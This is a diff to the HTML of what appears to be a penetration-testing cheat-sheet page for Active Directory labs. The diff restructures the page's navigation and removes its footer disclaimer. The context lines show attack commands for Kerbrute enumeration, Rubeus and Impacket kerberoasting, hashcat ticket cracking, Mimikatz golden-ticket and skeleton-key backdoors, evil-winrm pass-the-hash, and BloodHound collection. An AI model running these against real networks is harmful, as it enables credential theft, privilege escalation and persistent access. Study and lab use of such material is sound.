@@ -32,21 +32,23 @@
                         dog</h2>
                     <!-- Page Menu -->
                     <div class="has-text-centered">
-                    <a href="#h1" class="button is-link is-small is-light is-rounded">Kerbrute Enumerating</a>
-                    <a href="#h2" class="button is-warning is-small is-light is-rounded">Rubeus Kerberoasting</a>
-                    <a href="#h5" class="button is-info is-small is-light is-rounded">Rubeus AS-REP Roasting</a>
-                    <a href="#h6" class="button is-black is-small is-light is-rounded">Impacket Kerberoasting</a>
-                    <a href="#h7" class="button is-danger is-small is-light is-rounded">Crach Kerbero hash</a>
-                    <a href="#h8" class="button is-success is-small is-light is-rounded">Mimikatz</a>
-                    <a href="#h12" class="button is-danger is-small is-light is-rounded">Golden/Silver Ticket</a>
-                    <a href="#h15" class="button is-info is-small is-light is-rounded">Skeleton Key</a>
-                    <a href="#h18" class="button is-warning is-small is-light is-rounded">Elevating Privileges
+                    <a class="button is-link is-small is-light is-rounded contentSwitcher" data-target="kerbrute">Kerbrute Enumerating</a>
+                    <a class="button is-warning is-small is-light is-rounded contentSwitcher" data-target="rubeus">Rubeus Kerberoasting</a>
+                    <a class="button is-info is-small is-light is-rounded contentSwitcher" data-target="asrep">Rubeus AS-REP Roasting</a>
+                    <a class="button is-black is-small is-light is-rounded contentSwitcher" data-target="impacket">Impacket Kerberoasting</a>
+                    <a class="button is-danger is-small is-light is-rounded contentSwitcher" data-target="hash">Crack Kerbero hash</a>
+                    <a class="button is-success is-small is-light is-rounded contentSwitcher" data-target="mimi">Mimikatz</a>
+                    <a class="button is-danger is-small is-light is-rounded contentSwitcher" data-target="ticket">Golden/Silver Ticket</a>
+                    <a class="button is-info is-small is-light is-rounded contentSwitcher" data-target="skeleton">Skeleton Key</a>
+                    <a class="button is-warning is-small is-light is-rounded contentSwitcher" data-target="elimpacket">Elevating Privileges
                         Remotely</a>
-                    <a href="#h20" class="button is-link is-small is-light is-rounded">Post-exploit collection</a>
-                    <a href="#h24" class="button is-danger is-small is-light is-rounded">Maintain access</a>
+                    <a class="button is-link is-small is-light is-rounded contentSwitcher" data-target="postex">Post-exploit collection</a>
+                    <a class="button is-danger is-small is-light is-rounded contentSwitcher" data-target="mainacc">Maintain access</a>
+                    <a class="button is-danger is-small is-light is-rounded contentExpander">Expand All</a>
                     <br><br>
                     </div>
                     <!--Command board-->
+                    <div id="kerbrute" class="contentswitch">
                     <article class="message is-link">
                         <div class="message-header" id="h1">
                             <p>Enumerating Users w/ Kerbrute</p>
@@ -58,7 +60,8 @@
                             ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
                         </div>
                     </article>
-
+                </div>
+                <div id="rubeus" class="contentswitch">
                     <article class="message is-warning">
                         <div class="message-header" id="h2">
                             <p>Harvesting Tickets w/ Rubeus</p>
@@ -88,7 +91,8 @@
                             Rubeus.exe kerberoast
                         </div>
                     </article>
-
+                    </div>
+                    <div id="asrep" class="contentswitch">
                     <article class="message is-info">
                         <div class="message-header" id="h5">
                             <p>AS-REP Roasting w/ Rubeus <br>(krbasrep5 dump/ w/ Kerberos pre-authentication disabled)
@@ -101,7 +105,8 @@
                             Rubeus.exe asreproast
                         </div>
                     </article>
-
+                    </div>
+                    <div id="impacket" class="contentswitch">
                     <article class="message">
                         <div class="message-header" id="h6">
                             <p>Kerberoasting w/ Impacket (GetUserSPNs.py)</p>
@@ -113,7 +118,8 @@
                             sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request
                         </div>
                     </article>
-
+                    </div>
+                    <div id="hash" class="contentswitch">
                     <article class="message is-danger">
                         <div class="message-header" id="h7">
                             <p>Crack the ticket's hash</p>
@@ -125,7 +131,9 @@
                             hashcat -m 13100 -a 0 hash.txt Pass.txt
                         </div>
                     </article>
+                    </div>
 
+                    <div id="mimi" class="contentswitch">
                     <article class="message is-success">
                         <div class="message-header" id="h8">
                             <p>Pre-start mimikatz<br>Ensure this outputs [output '20' OK] with admin rights</p>
@@ -165,7 +173,9 @@
                             klist
                         </div>
                     </article>
+                    </div>
 
+                    <div id="ticket" class="contentswitch">
                     <article class="message is-danger">
                         <div class="message-header" id="h12">
                             <p>Golden/Silver Ticket hash dump w/ Mimikatz</p>
@@ -196,7 +206,9 @@
                             misc::cmd
                         </div>
                     </article>
+                    </div>
 
+                    <div id="skeleton" class="contentswitch">
                     <article class="message is-info">
                         <div class="message-header" id="h15">
                             <p>Kerberos Backdoors w/ mimikatz (Installing Skeleton Key)<br>(default credentials will be:
@@ -227,6 +239,9 @@
                             dir \\Desktop-1\c$ /user:Machine1 mimikatz
                         </div>
                     </article>
+                    </div>
+
+                    <div id="elimpacket" class="contentswitch">
                     <article class="message is-warning">
                         <div class="message-header" id="h18">
                             <p>Elevating Privileges w/ Impacket</p>
@@ -247,7 +262,9 @@
                             evil-winrm -i {ip} -u {username} -H {hash}
                         </div>
                     </article>
+                    </div>
 
+                    <div id="postex" class="contentswitch">
                     <article class="message is-link">
                         <div class="message-header" id="h20">
                             <p>Post-exploit Powershell startup</p>
@@ -286,7 +303,9 @@
                             Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
                         </div>
                     </article>
+                    </div>
 
+                    <div id="mainacc" class="contentswitch">
                     <article class="message is-danger">
                         <div class="message-header" id="h24">
                             <p>Generating Payload w/ msfvenom to maintain access</p>
@@ -329,23 +348,15 @@
                             </button>
                         </div>
                     </article>
+                    </div>
+
                     <br><br><br><br>
                     <!--End of Command board-->
                 </div>
                 <!--End of Home-->
             </section>
         </div>
-        <footer class="footer is-size-7">
-            <div class="content has-text-centered has-text-info">
-                <p>
-                    Content in this website are used in education purpose only, please do not use it in
-                    illegal
-                    way.<br>
-                    We have no responsibility for your use of this website and it's content.<br><br>
-                    This website is best view with 1280x720 or above.
-                </p>
-            </div>
-        </footer>
+        <div id="footer"></div>
     </container>
 </body>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
